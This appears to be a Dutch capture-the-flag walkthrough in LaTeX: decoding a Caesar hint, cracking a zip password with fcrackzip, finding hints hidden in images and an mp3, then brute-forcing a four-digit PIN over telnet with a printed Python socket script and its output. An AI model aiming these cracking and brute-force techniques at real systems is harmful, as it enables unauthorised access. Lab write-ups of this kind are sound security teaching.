\begin{enumerate}
  \item decipher: locdknox/ozsmjsz.jsz is de opgave.
  \item Gebruik een ceasar decoder.
  \item Oplossing: bestanden/epiczip.zip
  \item Ga naar http://192.168.255.130/bestanden/epiczip.zip
  	\begin{enumerate}
  	\item foto1, foto2, gaWeg.mp3 en README
  	\item password protected
  	\end{enumerate}
  \item gebruik fcrackzip om het paswoord te achterhalen
  	\begin{enumerate}
  	\item fcrackzip -b -l 6 -v -c 1a epiczip.zip
  	\item Na een paar minuten: 8394pw
  	\end{enumerate}
  \item Unzippen van de epiczip.zip
  \item README lezen
  	\begin{enumerate}
  	\item foto1		   		 - Hint for finding the solution
  	\item foto2              - Second hint for finding the solution
  	\item gaWeg.mp3          - Last for finding the solution
  	\end{enumerate}
  \item Hints overlopen
  	\begin{enumerate}
  	\item foto1:
  		\begin{enumerate}
  		\item Openen met fotobewerking programma (vb. GIMP
  		\item Pak de fuzzy select tool (magic wand)
  		\item Zet de treshold op 0
  		\item Selecteer het wit tussen de Keep Away letters
  		\item De letters telnet verschijnen
  		\end{enumerate}
  	\item foto2:
  		\begin{enumerate}
  		\item Openen met een image viewer
  		\item Inzoomen links onderaan de rode balk met Danger
  		\item 192.168.255.134 staat hier geschreven
  		\end{enumerate}
  	\item mp3:
  		\begin{enumerate}
  		\item Open gaWeg.mp3 met een hex-editor (vb: Bless Hex Editor)
  		\item Scroll volledig naar beneden
  		\item Port 8765 staat hier geschreven
  		\end{enumerate}
  	\end{enumerate}
  \item Hints samennemen: telnet 192.168.255.134 8765
  \item Open terminal en telnet 192.168.255.134 8765
  \item Brute-forcen van de pincode van 4 cijfers
  \item Oplossing: 7583
  \item Oplossing op de site: azernipcmkjsdizaer75348nopve
\end{enumerate}

\begin{lstlisting}
#!/usr/bin/env python
import socket
import sys
import re 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('192.168.255.134', 8765)

s.connect(server_address)

data = s.recv(250)
code = ""

try:
	for i in range(10000):
		if(re.search("\nPassword correct!", data)):
			break
		else:
                        code = "%04d" % i
                        s.sendall(code + "\n")
			#data = ""
                        data = s.recv(250)

finally:
	print "Code: ", code

s.close()

Output:
	Code: 7583
\end{lstlisting}